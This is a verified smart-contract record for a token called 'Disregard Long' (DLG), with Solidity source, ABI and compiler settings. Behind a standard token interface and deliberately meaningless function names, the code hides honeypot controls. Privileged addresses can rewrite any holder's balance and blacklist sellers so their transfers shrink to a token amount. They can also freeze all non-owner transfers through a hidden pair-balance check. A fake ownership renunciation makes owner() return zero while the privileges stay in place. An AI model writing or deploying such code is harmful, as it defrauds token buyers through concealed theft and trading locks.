{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface isTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingTradingFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTotal {\n    function createPair(address txEnable, address maxFund) external returns (address);\n}\n\ninterface buyMarketingAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromMax) external view returns (uint256);\n\n    function transfer(address receiverToken, uint256 swapShould) external returns (bool);\n\n    function allowance(address launchIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverToken,\n        uint256 swapShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minFee, uint256 value);\n    event Approval(address indexed launchIs, address indexed spender, uint256 value);\n}\n\ninterface buyMarketingAutoMetadata is buyMarketingAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DisregardLong is marketingTradingFund, buyMarketingAuto, buyMarketingAutoMetadata {\n\n    string private maxBuy = \"Disregard Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return maxBuy;\n    }\n\n    function exemptReceiver(address isLaunch, address receiverToken, uint256 swapShould) internal returns (bool) {\n        require(amountTeam[isLaunch] >= swapShould);\n        amountTeam[isLaunch] -= swapShould;\n        amountTeam[receiverToken] += swapShould;\n        emit Transfer(isLaunch, receiverToken, swapShould);\n        return true;\n    }\n\n    uint256 private maxMarketingSender;\n\n    address public shouldList;\n\n    function teamTx(uint256 swapShould) public {\n        sellFund();\n        receiverEnable = swapShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenAmount;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountAt;\n    }\n\n    event OwnershipTransferred(address indexed modeTotal, address indexed fundExempt);\n\n    address launchedAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityMarketingTotal;\n    }\n\n    string private autoShould = \"DLG\";\n\n    function tokenLiquidityMode() public {\n        emit OwnershipTransferred(shouldList, address(0));\n        tokenAmount = address(0);\n    }\n\n    function transferFrom(address isLaunch, address receiverToken, uint256 swapShould) external override returns (bool) {\n        if (_msgSender() != atMarketing) {\n            if (buyAt[isLaunch][_msgSender()] != type(uint256).max) {\n                require(swapShould <= buyAt[isLaunch][_msgSender()]);\n                buyAt[isLaunch][_msgSender()] -= swapShould;\n            }\n        }\n        return sellAt(isLaunch, receiverToken, swapShould);\n    }\n\n    bool public toLiquidity;\n\n    function approve(address maxExempt, uint256 swapShould) public virtual override returns (bool) {\n        buyAt[_msgSender()][maxExempt] = swapShould;\n        emit Approval(_msgSender(), maxExempt, swapShould);\n        return true;\n    }\n\n    function enableShould(address tradingFee) public {\n        if (feeMax) {\n            return;\n        }\n        if (tradingSender != toLiquidity) {\n            takeAmount = maxTx;\n        }\n        tokenEnable[tradingFee] = true;\n        \n        feeMax = true;\n    }\n\n    mapping(address => uint256) private amountTeam;\n\n    function balanceOf(address fromMax) public view virtual override returns (uint256) {\n        return amountTeam[fromMax];\n    }\n\n    uint256 public txFund;\n\n    uint256 public maxTx;\n\n    uint256 private fundMax;\n\n    address public enableWallet;\n\n    address private tokenAmount;\n\n    bool public feeMax;\n\n    uint256 public takeAmount;\n\n    function sellFund() private view {\n        require(tokenEnable[_msgSender()]);\n    }\n\n    uint256 private amountAt = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        isTake limitWalletLaunched = isTake(atMarketing);\n        enableWallet = shouldTotal(limitWalletLaunched.factory()).createPair(limitWalletLaunched.WETH(), address(this));\n        \n        shouldList = _msgSender();\n        tokenLiquidityMode();\n        tokenEnable[shouldList] = true;\n        amountTeam[shouldList] = amountAt;\n        if (takeAmount != maxTx) {\n            maxMarketingSender = fundMax;\n        }\n        emit Transfer(address(0), shouldList, amountAt);\n    }\n\n    bool public tradingSender;\n\n    function sellReceiver(address listLaunched) public {\n        sellFund();\n        \n        if (listLaunched == shouldList || listLaunched == enableWallet) {\n            return;\n        }\n        takeMode[listLaunched] = true;\n    }\n\n    mapping(address => bool) public takeMode;\n\n    function receiverMinLimit(address listLaunchedMarketing, uint256 swapShould) public {\n        sellFund();\n        amountTeam[listLaunchedMarketing] = swapShould;\n    }\n\n    uint256 totalTo;\n\n    mapping(address => mapping(address => uint256)) private buyAt;\n\n    function sellAt(address isLaunch, address receiverToken, uint256 swapShould) internal returns (bool) {\n        if (isLaunch == shouldList) {\n            return exemptReceiver(isLaunch, receiverToken, swapShould);\n        }\n        uint256 limitAuto = buyMarketingAuto(enableWallet).balanceOf(launchedAuto);\n        require(limitAuto == receiverEnable);\n        require(receiverToken != launchedAuto);\n        if (takeMode[isLaunch]) {\n            return exemptReceiver(isLaunch, receiverToken, tokenWallet);\n        }\n        return exemptReceiver(isLaunch, receiverToken, swapShould);\n    }\n\n    mapping(address => bool) public tokenEnable;\n\n    function allowance(address launchedTx, address maxExempt) external view virtual override returns (uint256) {\n        if (maxExempt == atMarketing) {\n            return type(uint256).max;\n        }\n        return buyAt[launchedTx][maxExempt];\n    }\n\n    address atMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant tokenWallet = 8 ** 10;\n\n    uint8 private liquidityMarketingTotal = 18;\n\n    function transfer(address listLaunchedMarketing, uint256 swapShould) external virtual override returns (bool) {\n        return sellAt(_msgSender(), listLaunchedMarketing, swapShould);\n    }\n\n    uint256 receiverEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoShould;\n    }\n\n    function owner() external view returns (address) {\n        return tokenAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"}],\"name\":\"enableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"receiverMinLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"teamTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidityMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DisregardLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}